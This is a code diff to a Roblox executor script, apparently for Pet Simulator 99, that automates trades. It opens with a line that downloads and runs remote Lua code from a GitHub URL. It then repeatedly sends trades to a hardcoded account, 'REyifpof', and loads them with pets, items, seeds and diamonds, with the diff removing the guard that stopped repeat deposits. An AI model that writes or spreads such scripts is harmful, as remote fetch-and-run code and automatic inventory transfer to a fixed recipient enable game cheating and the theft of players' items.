@@ -1,10 +1,11 @@
 --AUTO TRADE
 loadstring(game:HttpGet("https://raw.githubusercontent.com/fdvll/pet-simulator-99/main/waitForGameLoad.lua"))()
-wait(15)
+wait(5)
 if game.PlaceId == 8737899170 then
     Username = "REyifpof"
-    getgenv().PetToTrade = {}
-    getgenv().PaternToTrade = {}
+    getgenv().PetToTrade = {
+        {Pet = "Wireframe Dog", Patern = all, DecrementBy = 100}
+    }
     getgenv().ItemToTrade = {"Mini Pinata", "Mini Lucky Block", "Party Box", "Rainbow Mini Chest", "Mini Chest", "Charm Stone", "Large Gift Bag", "Gift Bag", "Secret Key Upper Half", "Void Key Upper Half", "Void Key Lower Half", "Secret Key Lower Half", "Crystal Key Upper Half", "Crystal Key Lower Half", "Tech Key Lower Half", "Tech Key Upper Half", "Daycare Slot Voucher", "Spinny Wheel Ticket", "Tech Spinny Wheel Ticket", "Diamond", "Insta Plant Capsule", "Seed Bag", "Arcade Token"}
 
     local library = require(game.ReplicatedStorage.Library)
@@ -55,42 +56,36 @@ if game.PlaceId == 8737899170 then
     end
 
 
-    local function DepositStatPetInTrade()
-        for i,v in pairs(save.Inventory.Pet) do
-            if v._am ~= nil then
-                for f, Patern in pairs(getgenv().PaternToTrade) do
-                    if v.pt == Patern then
-                        for _, PetName in pairs(getgenv().PetToTrade) do
-                            if v.id == PetName then
-                                wait(0.1)
-                                local args = {
-                                    [1] = GetTradeID(),
-                                    [2] = "Pet",
-                                    [3] = i,
-                                    [4] = v._am
-                                }
-                                game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Server: Trading: Set Item"):InvokeServer(unpack(args))
-                                print(v.pt, v.id, v._am)
+
+    local function DeepCopy(original)
+        local copy = {}
+        for key, value in pairs(original) do
+            if type(value) == "table" then
+                copy[key] = DeepCopy(value)
+            else
+                copy[key] = value
+            end
+        end
+        return copy
+    end
     
-                            end
+    local function DepositStatPetInTrade()
+        local inventoryCopy = DeepCopy(save.Inventory.Pet)
+        for i, v in pairs(inventoryCopy) do
+            if v._am ~= nil then
+                for _, list in ipairs(getgenv().PetToTrade) do
+                    if v.id == list.Pet and (list.Patern == all or v.pt == list.Patern or (v.pt == nil and list.Patern == 0)) then
+                        if list.DecrementBy and v._am >= list.DecrementBy then
+                            v._am = v._am - list.DecrementBy
                         end
-                    end
-                    if v.pt == nil then
-                        if Patern == 0 then
-                            for _, PetName in pairs(getgenv().PetToTrade) do
-                                if v.id == PetName then
-                                    wait(0.1)
-                                    local args = {
-                                        [1] = GetTradeID(),
-                                        [2] = "Pet",
-                                        [3] = i,
-                                        [4] = v._am
-                                    }
-                                    game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Server: Trading: Set Item"):InvokeServer(unpack(args))
-                                    print(v.pt, v.id, v._am)
-                                end
-                            end
-                        end
+                        wait(0.1)
+                        local args = {
+                            [1] = GetTradeID(),
+                            [2] = "Pet",
+                            [3] = i,
+                            [4] = v._am
+                        }
+                        game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Server: Trading: Set Item"):InvokeServer(unpack(args))
                     end
                 end
             end
@@ -180,14 +175,12 @@ if game.PlaceId == 8737899170 then
             SendTrade(Username)
         end
         if game.Players.LocalPlayer.PlayerGui.TradeWindow.Enabled == true and GetTradeID() ~= nil then
-            if deposited ~= true then
-                DepositPetInTrade()
-                DepositStatPetInTrade()
-                DepositItemInTrade()
-                DepositSeedInTrade()
-                DepositDiamondsInTrade()
-                ReadyTrade()
-            end
+            DepositPetInTrade()
+            DepositStatPetInTrade()
+            DepositItemInTrade()
+            DepositSeedInTrade()
+            DepositDiamondsInTrade()
+            ReadyTrade()
             wait(3)
         end
     end
